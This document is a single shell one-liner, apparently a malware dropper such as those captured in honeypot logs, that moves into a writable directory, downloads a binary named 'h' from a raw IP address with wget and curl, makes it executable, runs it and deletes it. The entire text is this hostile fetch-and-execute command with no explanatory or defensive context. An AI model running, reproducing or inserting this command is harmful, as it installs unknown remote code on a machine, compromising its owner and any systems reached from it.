cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/h; curl -O http://191.96.112.116/h; chmod +x h; ./h; rm -rf h
